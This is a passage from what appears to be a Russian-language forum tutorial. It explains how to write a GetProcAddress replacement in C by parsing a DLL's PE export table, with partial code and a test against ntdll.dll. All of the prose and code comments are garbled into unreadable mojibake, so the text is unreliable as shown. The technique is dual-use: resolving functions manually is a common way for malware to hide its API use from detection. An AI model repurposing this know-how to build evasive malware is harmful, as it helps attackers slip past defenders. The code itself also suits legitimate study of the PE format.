–∏–∑–≤–ª–µ–∫–∏—Ç–µ –∞–¥—Ä–µ—Å.<br />
<br />
–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Ñ—É–Ω–∫—Ü–∏—è–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ç–∞–±–ª–∏—Ü–µ —ç–∫—Å–ø–æ—Ä—Ç–∞ DLL –∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –µ–µ –≤ –ø–æ–∏—Å–∫–∞—Ö –∏–º–µ–Ω–∏ —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
–¢–∞–±–ª–∏—Ü–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞ - —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–∞—è –∫–∞–∫ IMAGE_EXPORT_DIRECTORY.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    DWORD   AddressOfNames;         // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    DWORD   AddressOfNameOrdinals;  // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</code></pre>
	</div>
</div><br />
–î–ª—è –Ω–∞—Å –∞–∫—Ç—É–∞–ª—å–Ω—ã –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Ç—Ä–∏ —ç–ª–µ–º–µ–Ω—Ç–∞.<br />
<br />
AddressOfFunctions - —É–∫–∞–∑—ã–≤–∞–µ—Ç –∞–¥—Ä–µ—Å –º–∞—Å—Å–∏–≤–∞ –∞–¥—Ä–µ—Å–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
AddressOfNames - —É–∫–∞–∑—ã–≤–∞–µ—Ç –∞–¥—Ä–µ—Å –º–∞—Å—Å–∏–≤–∞ –∞–¥—Ä–µ—Å–æ–≤ –∏–º–µ–Ω —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
AddressOfNameOrdinals - —É–∫–∞–∑—ã–≤–∞–µ—Ç –∞–¥—Ä–µ—Å –º–∞—Å—Å–∏–≤–∞ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π.<br />
<br />
<b>–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –∫–∞—Ç–∞–ª–æ–≥ —ç–∫—Å–ø–æ—Ä—Ç–∞, IMAGE_EXPORT_DIRECTORY</b><br />
<br />
–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // –î–µ–ª–∞–µ–º —ç—Ç–æ, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –ø—Ä–∏–≤–µ–¥–µ–Ω–∏—è –∫–∞–∂–¥—ã–π —Ä–∞–∑ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ &#039;hModule&#039;
    PBYTE pBase = (PBYTE) hModule;

    // –ü–æ–ª—É—á–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ DOS –∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å—å
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // –ü–æ–ª—É—á–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ NT –∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–ø–∏—Å—å
    PIMAGE_NT_HEADERS    pImgNtHdrs    = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // –ü–æ–ª—É—á–∞–µ–º –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;

    // –ü–æ–ª—É—á–∞–µ–º —Ç–∞–±–ª–∏—Ü—É —ç–∫—Å–ø–æ—Ä—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    // –≠—Ç–æ –∫–∞—Ç–∞–ª–æ–≥ —ç–∫—Å–ø–æ—Ä—Ç–∞
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // ...
}</code></pre>
	</div>
</div><br />
<b>–î–æ—Å—Ç—É–ø –∫ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Ñ—É–Ω–∫—Ü–∏—è–º</b><br />
<br />
–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É IMAGE_EXPORT_DIRECTORY –º–æ–∂–Ω–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏. –ß–ª–µ–Ω NumberOfFunctions —É–∫–∞–∑—ã–≤–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ñ—É–Ω–∫—Ü–∏–π, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö hModule. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏—Ç–µ—Ä–∞—Ü–∏–π —Ü–∏–∫–ª–∞ –¥–æ–ª–∂–Ω–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å NumberOfFunctions.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){
  // –ü–æ–∏—Å–∫ —Ü–µ–ª–µ–≤–æ–π —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏
}</code></pre>
	</div>
</div><br />
<b>–ü–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ –ª–æ–≥–∏–∫–∏ –ø–æ–∏—Å–∫–∞</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è —Å–æ–∑–¥–∞–Ω–∏–µ –ª–æ–≥–∏–∫–∏ –ø–æ–∏—Å–∫–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–π. –ü–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ –ª–æ–≥–∏–∫–∏ –ø–æ–∏—Å–∫–∞ —Ç—Ä–µ–±—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è AddressOfFunctions, AddressOfNames –∏ AddressOfNameOrdinals, –∫–æ—Ç–æ—Ä—ã–µ —è–≤–ª—è—é—Ç—Å—è –º–∞—Å—Å–∏–≤–∞–º–∏, —Å–æ–¥–µ—Ä–∂–∞—â–∏–º–∏ RVA, —Å—Å—ã–ª–∞—é—â–∏–µ—Å—è –Ω–∞ —É–Ω–∏–∫–∞–ª—å–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤ —Ç–∞–±–ª–∏—Ü–µ —ç–∫—Å–ø–æ—Ä—Ç–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _IMAGE_EXPORT_DIRECTORY {
    // ...
    // ...
    DWORD   AddressOfFunctions;     // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    DWORD   AddressOfNames;         // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    DWORD   AddressOfNameOrdinals;  // RVA –æ—Ç –±–∞–∑—ã –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</code></pre>
	</div>
</div><br />
–ü–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç—ã —è–≤–ª—è—é—Ç—Å—è RVA, –∫ –±–∞–∑–æ–≤–æ–º—É –∞–¥—Ä–µ—Å—É –º–æ–¥—É–ª—è, pBase, –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω VA. –ü–µ—Ä–≤—ã–µ –¥–≤–∞ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ –∫–æ–¥–∞ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –ø—Ä–æ—Å—Ç—ã–º–∏. –û–Ω–∏ –∏–∑–≤–ª–µ–∫–∞—é—Ç –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. –¢—Ä–µ—Ç–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∏–∑–≤–ª–µ–∫–∞–µ—Ç –ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–π –æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è –ø–æ–¥—Ä–æ–±–Ω–æ –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ä–∞–∑–¥–µ–ª–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionNameArray     = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionAddressArray     = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏
PWORD  FunctionOrdinalArray     = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</code></pre>
	</div>
</div><br />
<b>–ü–æ–Ω–∏–º–∞–Ω–∏–µ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤</b><br />
<br />
–ü–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏ - —ç—Ç–æ —Ü–µ–ª–æ—á–∏—Å–ª–µ–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—â–µ–µ –ø–æ–∑–∏—Ü–∏—é —Ñ—É–Ω–∫—Ü–∏–∏ –≤ —Ç–∞–±–ª–∏—Ü–µ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –≤ DLL. –¢–∞–±–ª–∏—Ü–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞–Ω–∞ –≤ –≤–∏–¥–µ —Å–ø–∏—Å–∫–∞ (–º–∞—Å—Å–∏–≤–∞) —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–∞–∂–¥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ—Ç—Å—è –ø–æ—Ä—è–¥–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞ –æ—Å–Ω–æ–≤–µ –µ–µ –ø–æ–ª–æ–∂–µ–Ω–∏—è –≤ —Ç–∞–±–ª–∏—Ü–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784733442.png"
		data-src="https://osint42.org/attachments/1746784733442-png.179/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784733442-png.179/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784733442.png"
			title="1746784733442.png"
			width="476" height="281" loading="lazy" />
	</div><br />
<br />
–í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –ø–æ—Ä—è–¥–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏, –∞ –Ω–µ –µ–µ –∏–º–µ–Ω–∏. –¢–∞–±–ª–∏—Ü–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —á—Ç–æ–±—ã –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —Å–ª—É—á–∞–∏, –∫–æ–≥–¥–∞ –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –∏–ª–∏ –Ω–µ —É–Ω–∏–∫–∞–ª—å–Ω–æ. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ —Å –ø–æ–º–æ—â—å—é –µ–µ –ø–æ—Ä—è–¥–∫–æ–≤–æ–≥–æ –Ω–æ–º–µ—Ä–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –±—ã—Å—Ç—Ä–µ–µ, —á–µ–º —Å –ø–æ–º–æ—â—å—é –µ–µ –∏–º–µ–Ω–∏. –ü–æ —ç—Ç–æ–π –ø—Ä–∏—á–∏–Ω–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –∞–¥—Ä–µ—Å VirtualAlloc —Ä–∞–≤–µ–Ω FunctionAddressArray[–ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä VirtualAlloc], –≥–¥–µ FunctionAddressArray - —ç—Ç–æ —É–∫–∞–∑–∞—Ç–µ–ª—å –º–∞—Å—Å–∏–≤–∞ –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏, –∏–∑–≤–ª–µ—á–µ–Ω–Ω—ã–π –∏–∑ —Ç–∞–±–ª–∏—Ü—ã —ç–∫—Å–ø–æ—Ä—Ç–∞.<br />
<br />
–£—á–∏—Ç—ã–≤–∞—è —ç—Ç–æ, —Å–ª–µ–¥—É—é—â–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –≤—ã–≤–µ–¥–µ—Ç –ø–æ—Ä—è–¥–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∫–∞–∂–¥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –º–∞—Å—Å–∏–≤–µ —Ñ—É–Ω–∫—Ü–∏–π —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –º–æ–¥—É–ª—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

// –¶–∏–∫–ª –ø–æ –≤—Å–µ–º —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Ñ—É–Ω–∫—Ü–∏—è–º
for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏
    CHAR* pFunctionName        = (CHAR*)(pBase + FunctionNameArray[i]);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ—Ä—è–¥–∫–æ–≤–æ–≥–æ –Ω–æ–º–µ—Ä–∞ —Ñ—É–Ω–∫—Ü–∏–∏
    WORD wFunctionOrdinal = FunctionOrdinalArray[i];

    // –í—ã–≤–æ–¥
    printf(&quot;[ %0.4d ] NAME: %s -\t ORDINAL: %d\n&quot;, i, pFunctionName, wFunctionOrdinal);
}</code></pre>
	</div>
</div><br />
<b>–ß–∞—Å—Ç–∏—á–Ω–∞—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b> <b>GetProcAddressReplacement </b><br />
<br />
–•–æ—Ç—è GetProcAddressReplacement –µ—â–µ –Ω–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∞, —Ç–µ–ø–µ—Ä—å –æ–Ω–∞ –¥–æ–ª–∂–Ω–∞ –≤—ã–≤–æ–¥–∏—Ç—å –∏–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–π –∏ –∏—Ö —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –ø–æ—Ä—è–¥–∫–æ–≤—ã–µ –Ω–æ–º–µ—Ä–∞.<br />
–ß—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —á—Ç–æ –±—ã–ª–æ –ø–æ—Å—Ç—Ä–æ–µ–Ω–æ –¥–æ —Å–∏—Ö –ø–æ—Ä, –≤—ã–∑–æ–≤–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é —Å —Å–ª–µ–¥—É—é—â–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>GetProcAddressReplacement(GetModuleHandleA(&quot;ntdll.dll&quot;), NULL);</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784747943.png"
		data-src="https://osint42.org/attachments/1746784747943-png.180/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784747943-png.180/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784747943.png"
			title="1746784747943.png"
			width="1014" height="1029" loading="lazy" />
	</div><br />
<br />
–ö–∞–∫ –æ–∂–∏–¥–∞–ª–æ—Å—å, –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏ –≤—ã–≤–æ–¥—è—Ç—Å—è –Ω–∞ –∫–æ–Ω—Å–æ–ª—å.<br />
<br />
<b>–ü–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä –∫ –∞–¥—Ä–µ—Å—É</b><br />
<br />
–° –ø–æ–º–æ—â—å—é –ø–æ—Ä—è–¥–∫–æ–≤–æ–≥–æ –Ω–æ–º–µ—Ä–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∏–º–µ–Ω —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π
PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);

// –ü–æ–ª—É—á–µ–Ω–∏–µ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ –º–∞—Å—Å–∏–≤ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏
PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

// –¶–∏–∫–ª –ø–æ –≤—Å–µ–º —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º —Ñ—É–Ω–∫—Ü–∏—è–º
for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++){

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏
    CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ—Ä—è–¥–∫–æ–≤–æ–≥–æ –Ω–æ–º–µ—Ä–∞ —Ñ—É–Ω–∫—Ü–∏–∏
    WORD wFunctionOrdinal = FunctionOrdinalArray[i];

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –µ–µ –ø–æ—Ä—è–¥–∫–æ–≤—ã–π –Ω–æ–º–µ—Ä
    PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);

    printf(&quot;[ %0.4d ] NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n&quot;, i, pFunctionName, pFunctionAddress, wFunctionOrdinal);
}</code></pre>
	</div>
</div><br />
–î–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä–æ–π—Ç–µ notepad.exe —Å –ø–æ–º–æ—â—å—é xdbg –∏ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —ç–∫—Å–ø–æ—Ä—Ç ntdll.dll.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784759860.png"
		data-src="https://osint42.org/attachments/1746784759860-png.181/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784759860-png.181/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784759860.png"
			title="1746784759860.png"
			width="1682" height="794" loading="lazy" />
	</div><br />
<br />
